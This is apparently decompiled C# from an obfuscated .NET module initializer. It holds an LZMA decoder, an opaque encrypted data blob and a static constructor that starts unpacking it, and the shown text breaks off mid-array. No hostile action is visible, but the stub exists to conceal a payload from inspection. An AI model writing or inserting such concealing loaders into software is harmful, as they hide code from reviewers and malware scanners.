using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

internal class _003CModule_003E
{
	internal struct Struct0
	{
		internal uint uint_0;

		internal void method_0()
		{
			uint_0 = 1024u;
		}

		internal uint method_1(Class0 rangeDecoder)
		{
			uint num = (rangeDecoder.uint_1 >> 11) * uint_0;
			if (rangeDecoder.uint_0 < num)
			{
				rangeDecoder.uint_1 = num;
				uint_0 += 2048 - uint_0 >> 5;
				if (rangeDecoder.uint_1 < 16777216)
				{
					rangeDecoder.uint_0 = (rangeDecoder.uint_0 << 8) | (byte)rangeDecoder.stream_0.ReadByte();
					rangeDecoder.uint_1 <<= 8;
				}
				return 0u;
			}
			rangeDecoder.uint_1 -= num;
			rangeDecoder.uint_0 -= num;
			uint_0 -= uint_0 >> 5;
			if (rangeDecoder.uint_1 < 16777216)
			{
				rangeDecoder.uint_0 = (rangeDecoder.uint_0 << 8) | (byte)rangeDecoder.stream_0.ReadByte();
				rangeDecoder.uint_1 <<= 8;
			}
			return 1u;
		}
	}

	internal struct Struct1
	{
		internal readonly Struct0[] struct0_0;

		internal readonly int int_0;

		internal Struct1(int numBitLevels)
		{
			int_0 = numBitLevels;
			struct0_0 = new Struct0[1 << numBitLevels];
		}

		internal void method_0()
		{
			for (uint num = 1u; num < 1 << int_0; num++)
			{
				struct0_0[num].method_0();
			}
		}

		internal uint method_1(Class0 rangeDecoder)
		{
			uint num = 1u;
			for (int num2 = int_0; num2 > 0; num2--)
			{
				num = (num << 1) + struct0_0[num].method_1(rangeDecoder);
			}
			return num - (uint)(1 << int_0);
		}

		internal uint method_2(Class0 rangeDecoder)
		{
			uint num = 1u;
			uint num2 = 0u;
			for (int i = 0; i < int_0; i++)
			{
				uint num3 = struct0_0[num].method_1(rangeDecoder);
				num <<= 1;
				num += num3;
				num2 |= num3 << i;
			}
			return num2;
		}

		internal static uint smethod_0(Struct0[] Models, uint startIndex, Class0 rangeDecoder, int NumBitLevels)
		{
			uint num = 1u;
			uint num2 = 0u;
			for (int i = 0; i < NumBitLevels; i++)
			{
				uint num3 = Models[startIndex + num].method_1(rangeDecoder);
				num <<= 1;
				num += num3;
				num2 |= num3 << i;
			}
			return num2;
		}
	}

	internal class Class0
	{
		internal uint uint_0;

		internal uint uint_1;

		internal Stream stream_0;

		internal void method_0(Stream stream)
		{
			stream_0 = stream;
			uint_0 = 0u;
			uint_1 = uint.MaxValue;
			for (int i = 0; i < 5; i++)
			{
				uint_0 = (uint_0 << 8) | (byte)stream_0.ReadByte();
			}
		}

		internal void method_1()
		{
			stream_0 = null;
		}

		internal void method_2()
		{
			while (uint_1 < 16777216)
			{
				uint_0 = (uint_0 << 8) | (byte)stream_0.ReadByte();
				uint_1 <<= 8;
			}
		}

		internal uint method_3(int numTotalBits)
		{
			uint num = uint_1;
			uint num2 = uint_0;
			uint num3 = 0u;
			for (int num4 = numTotalBits; num4 > 0; num4--)
			{
				num >>= 1;
				uint num5 = num2 - num >> 31;
				num2 -= num & (num5 - 1);
				num3 = (num3 << 1) | (1 - num5);
				if (num < 16777216)
				{
					num2 = (num2 << 8) | (byte)stream_0.ReadByte();
					num <<= 8;
				}
			}
			uint_1 = num;
			uint_0 = num2;
			return num3;
		}

		internal Class0()
		{
		}
	}

	internal class Class1
	{
		internal class Class2
		{
			internal readonly Struct1[] struct1_0 = new Struct1[16];

			internal readonly Struct1[] struct1_1 = new Struct1[16];

			internal Struct0 struct0_0;

			internal Struct0 struct0_1;

			internal Struct1 struct1_2 = new Struct1(8);

			internal uint uint_0;

			internal void method_0(uint numPosStates)
			{
				for (uint num = uint_0; num < numPosStates; num++)
				{
					struct1_0[num] = new Struct1(3);
					struct1_1[num] = new Struct1(3);
				}
				uint_0 = numPosStates;
			}

			internal void method_1()
			{
				struct0_0.method_0();
				for (uint num = 0u; num < uint_0; num++)
				{
					struct1_0[num].method_0();
					struct1_1[num].method_0();
				}
				struct0_1.method_0();
				struct1_2.method_0();
			}

			internal uint method_2(Class0 rangeDecoder, uint posState)
			{
				if (struct0_0.method_1(rangeDecoder) == 0)
				{
					return struct1_0[posState].method_1(rangeDecoder);
				}
				uint num = 8u;
				if (struct0_1.method_1(rangeDecoder) != 0)
				{
					num += 8;
					return num + struct1_2.method_1(rangeDecoder);
				}
				return num + struct1_1[posState].method_1(rangeDecoder);
			}

			internal Class2()
			{
			}
		}

		internal class Class3
		{
			internal struct Struct2
			{
				internal Struct0[] struct0_0;

				internal void method_0()
				{
					struct0_0 = new Struct0[768];
				}

				internal void method_1()
				{
					for (int i = 0; i < 768; i++)
					{
						struct0_0[i].method_0();
					}
				}

				internal byte method_2(Class0 rangeDecoder)
				{
					uint num = 1u;
					do
					{
						num = (num << 1) | struct0_0[num].method_1(rangeDecoder);
					}
					while (num < 256);
					return (byte)num;
				}

				internal byte method_3(Class0 rangeDecoder, byte matchByte)
				{
					uint num = 1u;
					do
					{
						uint num2 = (uint)(matchByte >> 7) & 1u;
						matchByte <<= 1;
						uint num3 = struct0_0[(1 + num2 << 8) + num].method_1(rangeDecoder);
						num = (num << 1) | num3;
						if (num2 != num3)
						{
							while (num < 256)
							{
								num = (num << 1) | struct0_0[num].method_1(rangeDecoder);
							}
							break;
						}
					}
					while (num < 256);
					return (byte)num;
				}
			}

			internal Struct2[] struct2_0;

			internal int int_0;

			internal int int_1;

			internal uint uint_0;

			internal void method_0(int numPosBits, int numPrevBits)
			{
				if (struct2_0 == null || int_1 != numPrevBits || int_0 != numPosBits)
				{
					int_0 = numPosBits;
					uint_0 = (uint)((1 << numPosBits) - 1);
					int_1 = numPrevBits;
					uint num = (uint)(1 << int_1 + int_0);
					struct2_0 = new Struct2[num];
					for (uint num2 = 0u; num2 < num; num2++)
					{
						struct2_0[num2].method_0();
					}
				}
			}

			internal void method_1()
			{
				uint num = (uint)(1 << int_1 + int_0);
				for (uint num2 = 0u; num2 < num; num2++)
				{
					struct2_0[num2].method_1();
				}
			}

			internal uint method_2(uint pos, byte prevByte)
			{
				return ((pos & uint_0) << int_1) + (uint)(prevByte >> 8 - int_1);
			}

			internal byte method_3(Class0 rangeDecoder, uint pos, byte prevByte)
			{
				return struct2_0[method_2(pos, prevByte)].method_2(rangeDecoder);
			}

			internal byte method_4(Class0 rangeDecoder, uint pos, byte prevByte, byte matchByte)
			{
				return struct2_0[method_2(pos, prevByte)].method_3(rangeDecoder, matchByte);
			}

			internal Class3()
			{
			}
		}

		internal readonly Struct0[] struct0_0 = new Struct0[192];

		internal readonly Struct0[] struct0_1 = new Struct0[192];

		internal readonly Struct0[] struct0_2 = new Struct0[12];

		internal readonly Struct0[] struct0_3 = new Struct0[12];

		internal readonly Struct0[] struct0_4 = new Struct0[12];

		internal readonly Struct0[] struct0_5 = new Struct0[12];

		internal readonly Class2 class2_0 = new Class2();

		internal readonly Class3 class3_0 = new Class3();

		internal readonly Class4 class4_0 = new Class4();

		internal readonly Struct0[] struct0_6 = new Struct0[114];

		internal readonly Struct1[] struct1_0 = new Struct1[4];

		internal readonly Class0 class0_0 = new Class0();

		internal readonly Class2 class2_1 = new Class2();

		internal bool bool_0;

		internal uint uint_0;

		internal uint uint_1;

		internal Struct1 struct1_1 = new Struct1(4);

		internal uint uint_2;

		internal Class1()
		{
			uint_0 = uint.MaxValue;
			for (int i = 0; i < 4L; i++)
			{
				struct1_0[i] = new Struct1(6);
			}
		}

		internal void method_0(uint dictionarySize)
		{
			if (uint_0 != dictionarySize)
			{
				uint_0 = dictionarySize;
				uint_1 = Math.Max(uint_0, 1u);
				uint windowSize = Math.Max(uint_1, 4096u);
				class4_0.method_0(windowSize);
			}
		}

		internal void method_1(int lp, int lc)
		{
			class3_0.method_0(lp, lc);
		}

		internal void method_2(int pb)
		{
			uint num = (uint)(1 << pb);
			class2_0.method_0(num);
			class2_1.method_0(num);
			uint_2 = num - 1;
		}

		internal void method_3(Stream inStream, Stream outStream)
		{
			class0_0.method_0(inStream);
			class4_0.method_1(outStream, bool_0);
			for (uint num = 0u; num < 12; num++)
			{
				for (uint num2 = 0u; num2 <= uint_2; num2++)
				{
					uint num3 = (num << 4) + num2;
					struct0_0[num3].method_0();
					struct0_1[num3].method_0();
				}
				struct0_2[num].method_0();
				struct0_3[num].method_0();
				struct0_4[num].method_0();
				struct0_5[num].method_0();
			}
			class3_0.method_1();
			for (uint num = 0u; num < 4; num++)
			{
				struct1_0[num].method_0();
			}
			for (uint num = 0u; num < 114; num++)
			{
				struct0_6[num].method_0();
			}
			class2_0.method_1();
			class2_1.method_1();
			struct1_1.method_0();
		}

		internal void method_4(Stream inStream, Stream outStream, long inSize, long outSize)
		{
			method_3(inStream, outStream);
			Struct3 @struct = default(Struct3);
			@struct.method_0();
			uint num = 0u;
			uint num2 = 0u;
			uint num3 = 0u;
			uint num4 = 0u;
			ulong num5 = 0uL;
			if (0uL < (ulong)outSize)
			{
				struct0_0[@struct.uint_0 << 4].method_1(class0_0);
				@struct.method_1();
				byte b = class3_0.method_3(class0_0, 0u, 0);
				class4_0.method_5(b);
				num5++;
			}
			while (num5 < (ulong)outSize)
			{
				uint num6 = (uint)(int)num5 & uint_2;
				if (struct0_0[(@struct.uint_0 << 4) + num6].method_1(class0_0) == 0)
				{
					byte prevByte = class4_0.method_6(0u);
					byte b2 = (@struct.method_5() ? class3_0.method_3(class0_0, (uint)num5, prevByte) : class3_0.method_4(class0_0, (uint)num5, prevByte, class4_0.method_6(num)));
					class4_0.method_5(b2);
					@struct.method_1();
					num5++;
					continue;
				}
				uint num7;
				if (struct0_2[@struct.uint_0].method_1(class0_0) != 1)
				{
					num4 = num3;
					num3 = num2;
					num2 = num;
					num7 = 2 + class2_0.method_2(class0_0, num6);
					@struct.method_2();
					uint num8 = struct1_0[smethod_0(num7)].method_1(class0_0);
					if (num8 >= 4)
					{
						int num9 = (int)((num8 >> 1) - 1);
						num = (2 | (num8 & 1)) << num9;
						if (num8 >= 14)
						{
							num += class0_0.method_3(num9 - 4) << 4;
							num += struct1_1.method_2(class0_0);
						}
						else
						{
							num += Struct1.smethod_0(struct0_6, num - num8 - 1, class0_0, num9);
						}
					}
					else
					{
						num = num8;
					}
				}
				else
				{
					if (struct0_3[@struct.uint_0].method_1(class0_0) == 0)
					{
						if (struct0_1[(@struct.uint_0 << 4) + num6].method_1(class0_0) == 0)
						{
							@struct.method_4();
							class4_0.method_5(class4_0.method_6(num));
							num5++;
							continue;
						}
					}
					else
					{
						uint num10;
						if (struct0_4[@struct.uint_0].method_1(class0_0) != 0)
						{
							if (struct0_5[@struct.uint_0].method_1(class0_0) == 0)
							{
								num10 = num3;
							}
							else
							{
								num10 = num4;
								num4 = num3;
							}
							num3 = num2;
						}
						else
						{
							num10 = num2;
						}
						num2 = num;
						num = num10;
					}
					num7 = class2_1.method_2(class0_0, num6) + 2;
					@struct.method_3();
				}
				if ((num >= num5 || num >= uint_1) && num == uint.MaxValue)
				{
					break;
				}
				class4_0.method_4(num, num7);
				num5 += num7;
			}
			class4_0.method_3();
			class4_0.method_2();
			class0_0.method_1();
		}

		internal void method_5(byte[] properties)
		{
			int lc = properties[0] % 9;
			int num = properties[0] / 9;
			int lp = num % 5;
			int pb = num / 5;
			uint num2 = 0u;
			for (int i = 0; i < 4; i++)
			{
				num2 += (uint)(properties[1 + i] << i * 8);
			}
			method_0(num2);
			method_1(lp, lc);
			method_2(pb);
		}

		internal static uint smethod_0(uint len)
		{
			len -= 2;
			if (len < 4)
			{
				return len;
			}
			return 3u;
		}
	}

	internal class Class4
	{
		internal byte[] byte_0;

		internal uint uint_0;

		internal Stream stream_0;

		internal uint uint_1;

		internal uint uint_2;

		internal void method_0(uint windowSize)
		{
			if (uint_2 != windowSize)
			{
				byte_0 = new byte[windowSize];
			}
			uint_2 = windowSize;
			uint_0 = 0u;
			uint_1 = 0u;
		}

		internal void method_1(Stream stream, bool solid)
		{
			method_2();
			stream_0 = stream;
			if (!solid)
			{
				uint_1 = 0u;
				uint_0 = 0u;
			}
		}

		internal void method_2()
		{
			method_3();
			stream_0 = null;
			Buffer.BlockCopy(new byte[byte_0.Length], 0, byte_0, 0, byte_0.Length);
		}

		internal void method_3()
		{
			uint num = uint_0 - uint_1;
			if (num != 0)
			{
				stream_0.Write(byte_0, (int)uint_1, (int)num);
				if (uint_0 >= uint_2)
				{
					uint_0 = 0u;
				}
				uint_1 = uint_0;
			}
		}

		internal void method_4(uint distance, uint len)
		{
			uint num = uint_0 - distance - 1;
			if (num >= uint_2)
			{
				num += uint_2;
			}
			while (len != 0)
			{
				if (num >= uint_2)
				{
					num = 0u;
				}
				byte_0[uint_0++] = byte_0[num++];
				if (uint_0 >= uint_2)
				{
					method_3();
				}
				len--;
			}
		}

		internal void method_5(byte b)
		{
			byte_0[uint_0++] = b;
			if (uint_0 >= uint_2)
			{
				method_3();
			}
		}

		internal byte method_6(uint distance)
		{
			uint num = uint_0 - distance - 1;
			if (num >= uint_2)
			{
				num += uint_2;
			}
			return byte_0[num];
		}

		internal Class4()
		{
		}
	}

	internal struct Struct3
	{
		internal uint uint_0;

		internal void method_0()
		{
			uint_0 = 0u;
		}

		internal void method_1()
		{
			if (uint_0 < 4)
			{
				uint_0 = 0u;
			}
			else if (uint_0 >= 10)
			{
				uint_0 -= 6u;
			}
			else
			{
				uint_0 -= 3u;
			}
		}

		internal void method_2()
		{
			uint_0 = ((uint_0 < 7) ? 7u : 10u);
		}

		internal void method_3()
		{
			uint_0 = ((uint_0 < 7) ? 8u : 11u);
		}

		internal void method_4()
		{
			uint_0 = ((uint_0 < 7) ? 9u : 11u);
		}

		internal bool method_5()
		{
			return uint_0 < 7;
		}
	}

	[StructLayout(LayoutKind.Explicit, Size = 448)]
	internal struct Struct4
	{
	}

	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 3072)]
	internal struct Struct5
	{
	}

	internal static byte[] byte_0;

	internal static Struct4 struct4_0/* Not supported: data

	internal static Assembly assembly_0;

	internal static Struct5 struct5_0/* Not supported: data(0E 1E 20 60 5B 1F 07 46 73 2E 03 16 D2 5F 21 23 B1 62 25 25 AB 8B DB 8E 78 81 60 31 2C B9 D7 6F 47 2A 23 CB A3 2C EB 9E AC 2A DA 08 38 13 A2 3B B9 F7 5B 38 29 EB C8 40 60 60 03 0E 21 10 E6 3D 25 D6 CB 42 1E E1 46 BC C0 77 8C 64 D6 56 A1 4C 8B 0E 7B E0 FF 8E 07 26 5F 90 6A 6D B3 36 86 D6 FB 4F D3 EA BF B7 B9 61 52 E1 DD 16 11 90 B1 52 E2 ED 30 D6 5E 36 F6 48 45 3C 8F D5 82 2D BB A0 1F AB EB 09 67 8C FD AF D6 2C 07 08 61 30 58 0E 41 6A 18 B2 5B C1 13 36 09 71 A5 27 66 5F 44 4B 40 70 D7 6F 3A BA 76 64 C0 4F 1F 0B C3 E5 C8 F1 98 96 C2 9E E6 6B 1E 49 1F 4B 72 46 4D F5 03 A6 87 56 98 91 10 62 0C 8A 64 C2 80 A2 B1 B9 80 D3 7C CB F9 EB 45 26 98 16 11 3F 24 7B E3 46 51 65 A7 D3 4A 93 A9 DE 41 7E 0D DA A4 9B 09 3F D3 38 98 84 21 6F 9C A1 DA 4E 47 80 09 2D 9D 73 F6 9E 08 B9 8D A2 A5 0E 5C EB 39 9B 74 82 54 00 50 04 7A 32 32 FF 24 58 DE 83 70 3A 7E 81 8F F1 5E D1 77 B7 C3 3F A7 D8 86 98 E4 56 BF 8F F2 E9 80 FF EE D0 6D 7F 18 A9 FC B7 B7 42 3A AA CA 1A B3 F4 53 9F 49 9C C6 60 F2 6F 10 94 EE 2D 93 F7 53 FF 60 93 E3 F0 10 03 1C F7 CA 7E E5 FC 67 32 66 9E 3A D5 95 5B 95 1A DB F3 B8 9A F5 1E F1 ED CE FF 4B 43 67 77 C0 22 60 65 BF 66 21 0A 49 B9 60 FA 03 9E D7 D1 FD 7A 35 99 E5 05 DD 2C E2 31 BC 56 B6 11 5C 5F 44 14 42 21 58 6A 7C CC 1C E7 6E 1E 9A 70 2F 82 53 CF 44 BC A8 78 D5 5A 01 C5 DA 33 F1 ED B1 17 56 60 93 A5 95 A6 31 F0 39 FF E9 95 14 E7 C1 42 D5 D8 10 15 CE 21 B6 00 4C 48 3D CF 39 8F 23 11 6D 75 44 A6 63 C0 DC D3 33 BA 77 3D 0E BC 4C 68 0D B0 AE 0B 7A E5 06 D5 10 50 77 51 99 E8 6B 55 9B 89 A7 BB E1 E6 31 A6 C8 D9 CE 3E 50 CD EE ED DC 5D 07 9B A5 C2 06 12 4B 51 94 8A 57 26 D2 BE 6D 9C 14 A1 29 76 40 D6 CD F5 5E FA 23 E0 3E 7E 2C 82 DB 75 FB 7C 86 02 43 23 C4 4C E0 FB A4 CA 92 F2 59 92 17 BA A0 C7 39 FF 4C 42 AD 94 81 2D 04 C3 2C DB CE 4C 16 B7 5F 51 C5 98 AF 7C 1C A1 C0 F5 DD C1 3A 92 F5 9B D6 9F 50 A6 A5 5C 66 32 55 81 B5 A5 85 A9 CE 93 50 E5 06 D6 E0 AF 25 29 3D CF 78 96 EA 50 B9 E2 18 87 6B D2 59 44 23 68 93 71 89 E9 03 97 2B D6 A9 3C 9B EB 2A C5 2E 08 7B 12 46 4A 35 77 59 90 84 11 64 F8 34 E9 B0 F7 2F 7B 84 3A 6B 3D BE 17 B5 EE 31 46 BC 6E 96 CC 67 FD DF 2E 4D 03 00 7A 3F 0B 22 5B 17 D4 02 1B 47 E6 E6 56 CD 68 C9 0D 7F C9 2A 8F CF C1 54 EB 15 51 15 2C A7 4E 30 36 6D 98 CA 79 F4 70 CE 00 A7 A9 10 A4 B1 2E CE 8E 9F 32 CC 51 61 DB 55 19 06 7F 47 3C 16 66 D5 BC 5B 8E 34 B2 4E 35 87 48 A7 DF 6E F2 9D FE 1C 84 F0 9E B7 9C 33 5B FF C7 C9 FD AA 7C D6 9A 7C 78 E4 E8 C2 AF 5F 04 F1 B7 A8 BF 87 23 D1 D1 FA 46 12 A5 2E B8 51 DB E1 FE B4 29 06 C8 9C 49 E7 EC D5 E3 84 CD E1 5B C2 4E B9 9A CD 49 32 A7 64 3C 6E D0 A5 D8 0C DD F5 07 7C 4D F1 CA 00 D9 56 63 18 80 46 5F 67 CA 24 F2 7D 44 53 6D 9B 4E BF B0 AC 12 A3 F8 D4 3A 80 1A CD 1B 00 CB 9B DE 75 11 9B B2 F1 14 07 2D E5 E4 6A FA 2F 3A F2 24 5D 7F 68 5C 35 05 3C 51 0F 5B 29 6D F9 1B 1B 1D 4F 1C 93 CA EF D6 19 20 3E 55 0B 17 F9 9B 13 51 77 59 90 3F 48 F4 98 8A F6 F8 3A 29 D0 29 0B CB 47 13 3B 57 49 16 9A 17 81 AB CD A1 0B C4 07 41 27 DF 35 CE 7A 8B 18 50 C0 F5 40 06 7F 8C A8 47 E9 A2 F7 6D D6 07 05 5A 60 A8 AA B9 BD 9E 67 A1 C8 20 84 55 B5 D2 97 22 3D E5 AD 4C FB 4C 50 D3 35 D0 68 37 55 E2 EA C5 E8 59 06 87 A8 1E 22 6B 9D BC 30 37 5A 32 11 6A 9B 8A FB A1 C9 2E 49 73 83 80 2A 14 28 85 7A AA 22 D8 07 23 8D D2 83 15 A4 78 E2 CF 14 70 04 65 01 A2 7E 61 2F 7B FC A5 1D DD E7 24 4F 90 12 CC 60 38 5F 95 A9 28 3C 06 42 22 85 3E B0 62 99 9D 17 7D CF 69 0B 52 8F E2 D6 36 57 12 A2 FA D0 CC 23 41 66 C1 C0 64 BD 59 73 51 FC 23 62 87 02 F4 39 4F 31 2F 2D 01 08 22 3F D3 74 F6 0A DC 85 CB 27 FC A1 BF A0 04 04 59 9A 3C 3E 61 8F 93 F7 6E 65 B2 56 78 4C 85 6F 1B 1A 97 2F DD 3B 75 8E 80 E0 40 56 3B FF DA F7 B9 19 BB 2F 07 F1 C1 CF 16 15 4B FB BA 26 65 57 D3 C6 82 28 CB 58 3F 5C BE 73 BA 65 17 9B 62 79 2F 04 8B DE 0A 0B 1A 19 EF 01 D1 3E 2F 68 D2 F1 EE C2 70 47 63 3B 4C 95 BB E6 62 35 EE 9A 51 11 E0 7C A2 26 26 6D 45 A7 A1 42 4D 69 13 CA 0C BD 98 91 CF 16 85 AF 19 9E ED C8 EC 6F DD 06 3E 1A DE 64 C4 F4 F2 F8 FE 28 DC D8 06 CB 99 73 52 70 C9 66 67 B4 35 2C DF E2 BD 1A A1 57 CC 5D 98 B6 99 16 C1 4E 6A 0D BE 8D 78 C6 96 2E BA 52 6F DF 62 5E 51 03 79 D1 61 A7 B6 AA A3 43 5C 76 1B FB FA 8C EE 68 37 64 A8 83 F1 DC 49 0C ED 09 4F 27 FD F1 21 7D B2 84 A2 0D 5A 9F 76 5C FB C3 B6 53 5E EA 06 39 A8 C0 80 26 2F AC 23 12 D7 80 07 39 87 DD C1 56 39 02 AD B4 05 F4 55 55 DD F2 BD 3F F6 0F 28 FA F3 F4 CD 0E C4 F1 1A 0A 55 9A 5E 3F 24 83 28 F9 B9 81 56 81 AE 66 2C F7 B2 B2 B3 CE D9 AA 18 94 3E 0D E5 ED F2 6A 2B 78 1B B5 C6 BA 87 14 2B 6D DE 34 96 94 4E 8C 00 D1 E1 31 1C 9C 18 F4 6E 80 CC B5 04 9B B5 A6 7D B9 E7 19 2D 51 B4 E2 D7 B0 5F 38 15 BD C5 13 2A E6 E2 98 7F B7 CE B2 8C C8 14 58 11 0F 4F C2 98 84 E8 4A C0 E3 4D 6A ED F6 06 CA 1B B9 5D 2C 8B 7A B5 E6 7C 25 78 47 5D 7D 80 BF 17 56 65 68 67 1F B7 18 CD 5E B5 A6 D1 90 3F EC 58 EC 1C 28 8A DD C0 74 E8 A4 BC FA A2 49 DC DE 5A 7D 36 8C E2 09 50 62 9A 9B A0 64 75 23 1E 77 99 C5 91 BA 09 B7 84 3B 78 74 69 2A DF 35 04 F8 5C A8 19 8C 65 22 EC 80 54 9A 35 C2 D0 D6 2C F8 DF 06 EF B6 19 7C 05 A7 1E 90 C3 1C 83 03 D4 89 95 7F 72 6D 45 F1 FD 0C 9C 61 B0 E5 78 F8 DB 62 26 33 F5 F1 93 A7 9F D2 43 5E 8E 53 F6 BC 00 7F F1 23 F4 B1 D8 D9 98 13 F5 B1 5D 85 09 74 61 9E B0 3C 72 A7 44 61 BA BA 44 86 FA FF 1E 74 A7 06 78 25 41 24 A6 13 A8 BA 60 C9 10 96 44 A5 9C D5 A3 94 F4 FB 9A 36 F7 D1 52 C5 7D B6 31 AC EA 88 98 A5 99 D4 9F 60 7F F2 60 36 BC 5A E1 3F 4F 3B C1 A4 BE 17 A9 9F 11 2F 1A 3D 2D 7D 93 25 28 EE 43 CD 20 74 B4 B9 AD 79 E7 F9 A5 60 B9 44 21 B6 E6 B0 E5 B3 29 45 6E 4A 9D F3 98 E4 6E 58 FC 56 5E CA 1D FE 2E 3D 25 63 AC 41 9F 67 E9 76 42 10 D4 32 F2 1C 87 D9 34 3E 40 3B 75 E0 AC 56 A9 93 CA 21 CF C0 09 B4 6E 61 3F D3 F0 72 F8 52 A3 45 B4 3F 36 9B 8E 00 94 4A 6E CF 9B 0A D8 99 01 AD 7A D5 DF C1 64 01 FD 08 BE C4 AA 3C E7 BF E8 2D 7E D1 03 C0 63 EA AD 59 EA 0C 27 52 B6 59 27 13 74 29 7B D3 5C B9 F5 AC 80 52 92 4A 67 80 87 D9 C0 BF D7 00 5F 66 74 8B 1B D0 95 0D 5B DC FA 06 15 32 AE 45 07 64 37 6F 76 65 08 77 51 85 2C 1C DA 50 75 5C F5 E6 24 83 79 9D 38 A0 DA 5E E1 17 C4 A3 75 C7 DB 7F 76 B9 A1 B7 90 B4 53 1C 67 36 A0 48 2F E2 00 F0 C6 52 9D A6 60 DD E6 9E 0B 49 10 B4 0B 4C DF AE 3E DD E7 22 F2 FE 19 8C 02 3C 72 1C BA D9 5F E3 FE A3 19 B4 38 1B 11 D1 CA C6 4A E3 DF CA 48 F5 A4 8A 1D 00 77 75 82 85 7F 93 C7 6F BC 4A 6B E5 7D 9B DE A2 E1 F8 9A B4 FC 00 42 C0 0A A3 82 FC 05 44 56 76 79 A5 98 9A 57 FF 14 E7 E1 1C 73 FF E5 CA 79 63 F4 6E BD D2 78 0E FD A5 02 4D 88 EC 08 FF 65 68 52 1B 12 56 1D 7B 73 C5 DA 52 FB 9E A3 5E 1A 56 97 C5 37 30 09 8B 01 20 36 55 7A E1 C3 A6 DF D0 C7 DF 44 14 A0 57 12 C8 1D E5 D6 1E 50 CE 26 C1 42 E6 9C 68 66 5D 56 7E 69 68 63 64 9A 6F B2 1B 78 56 0D 49 54 89 BF CA 5F 43 0A 5C F8 E6 9C 8E 00 CE 90 E1 2F 2D 91 54 70 37 20 3F 0E 92 FC 03 CB 86 14 EE 55 EB 87 9D 78 49 06 4C 5A C1 75 B1 CD 79 F7 DA 28 49 61 DA 6D E5 3D A8 9C B8 90 F9 FF 51 9D 60 59 E6 B6 0A 56 1E E7 59 50 CB F5 C9 58 88 8D C9 CB 1B 53 A1 62 E0 6C 08 A8 96 17 FC 16 4B FD 89 36 B9 66 49 C2 45 23 02 7A 82 E1 45 22 A0 D6 B1 FB D7 CF DA C8 07 D1 A5 96 75 C7 A7 35 7B AE 2F 10 17 61 C5 79 9F DA 4F 09 C5 62 02 21 10 F5 70 0D 98 D5 3F 45 F6 82 78 BD BF B0 73 FF C9 65 B9 64 D9 84 D1 CD 59 4E 81 69 79 48 C1 E0 87 2B 0B A8 15 DE 20 DE 55 FD 2D 98 5F 19 83 10 16 3D F0 F1 AB CA 0D CC A7 48 EE B4 CD A7 92 4E 26 13 DC 75 23 AB CB CF D2 CB 2A 8B 7D 04 95 10 D3 75 2E 24 A6 61 31 4E 7F A7 B0 08 0F 98 D2 18 C5 5E 86 80 8C 54 8D 5A 24 21 8F 66 97 A9 60 C7 8C 2C 5A 6E B6 5D A8 7A 54 E6 61 20 26 B6 0E 7B C0 99 10 C9 A9 32 CF BF 8B 26 11 7E 30 14 60 1E 66 47 66 09 1D 5E 21 7F FA 93 FC 0C 6D 2B 4F 57 E4 FC CC 95 9C A7 DA AA D3 CD 01 7A 6D 48 4C 0A 57 7A 6A 02 53 C6 DE 67 98 0A 3A 59 99 D0 EE D5 AA CE 79 DF 50 00 C5 06 2B C0 6E 49 41 16 94 A4 8C 0D 34 C9 CB CA CC 9F B8 00 C3 2A F7 93 04 32 5B 96 35 2F 8A 3A B6 3F F3 AD 33 C7 48 B8 68 C1 8B 04 B1 F9 60 C1 74 C4 BD E2 49 D2 5E 41 61 DC 16 44 2C 71 79 02 FB 4C B1 51 32 FB 44 F8 EA C5 2A BF 90 28 50 34 1B E8 C6 9C BB 64 81 68 94 8A AC 6C 7F 33 EA A1 45 9F 9F D0 48 C5 9C 8D 7C 43 E1 B9 DA 04 EB A7 A8 14 1A 2C 3F 32 C2 7B C7 DA 85 9B E8 92 C2 C4 5C 5B BE 77 1A 8C F6 B4 EB F7 02 87 62 4D 91 08 19 DC CB 80 6F 8E EA FB AB EF E7 4A F5 B5 F0 53 1B 10 DE D1 9F DC B6 09 9A C8 96 C7 22 DF A3 71 1F 50 FF 6C 95 DB 04 48 F6 0A 17 AD 5D 81 30 04 03 5A 7B 4F AA B8 3A A4 C4 E9 B8 E0 DD 64 40 8C CD 72 67 F3 52 00 79 D7 0C 91 D7 58 1F 56 8A 59 51 DE 92 C5 86 D2 7D 91 54 88 34 98 76 98 A9 04 2E D6 E5 05 E7 07 45 9D 93 57 8C B3 FF D5 03 BC 4F 3A 05 7A FD CA 8D D1 00 37 FA FB 71 44 B4 8E 7D 94 0F B3 E2 0F 9B 49 6B CD CB 5F CE 72 B8 5C BB B7 81 E2 5B EE 9E 6E 74 4B 1F D2 99 57 C8 DB B1 E5 39 8A 0D F7 F4 7A F5 40 74 C3 E4 AB 5C 92 B3 9A 42 40 04 24 66 FE E0 9D 3C 9F 39 7C 07 15 49 F3 47 15 C0 5A D9 A4 7F D0 C0 31 25 65 30 FE F4 50 3A A7 76 F8 88 D2 EC 29 DE A9 F7 BD F1 F7 8D 87 70 74 F1 79 3A 96 E7 5E 96 47 29 E5 0E B4 9A 57 A0 FC 53 6B 80 86 6E 5D 23 EC 8A CA E0 0D A8 23 34 7C B7 A5 5C 99 5C 8F 60 08 86 AE 08 AA F9 C4 24 F4 1E C4 2A AF 92 8A 27 89 B7 AD 36 55 20 02 DF 21 FA 56 8F 12 71 58 00 5F 0E 3F 96 89 3C 1D 4A C0 D5 42 26 32 CB 46 C2 60 2B A5 08 CD 78 DE 14 EF 4D 69 03 13 5C 42 B9 C1 7C 90 89 17 BE 64 27 24 9C F6 A8 94 ED 7C 42 E7 83 05 B3 C4 E0 17 CB 46 A4 3F 8F 12 71 58 00 5F 0E 3F 96 89 3C 1D 4A C0 D5 42 26 32 CB 46 C2 60 2B A5 08 CD 78 DE 14 EF 4D 69 03 13 5C 42 B9 C1 7C 90 89 17 BE 64 27 24 9C F6 A8 94 ED 7C 42 E7 83 05 B3 C4) */;

	unsafe static _003CModule_003E()
	{
		smethod_9();
		smethod_7();
		uint num = 112u;
		uint[] array = new uint[112]
		{
			2845228575u, 2073493286u, 3013123698u, 1414324348u, 2466871160u, 1051917184u, 3380535783u, 1577650293u, 987748396u, 1165388633u,
			4133094651u, 1283661970u, 763696203u, 3933379253u, 1825160216u, 2390518783u, 1406358990u, 3830066063u, 3856100302u, 867474512u,
			3870843024u, 3900879284u, 1545882776u, 1983676797u, 4039326926u, 2023456025u, 3983576039u, 2918043887u, 3715443801u, 204849991u,
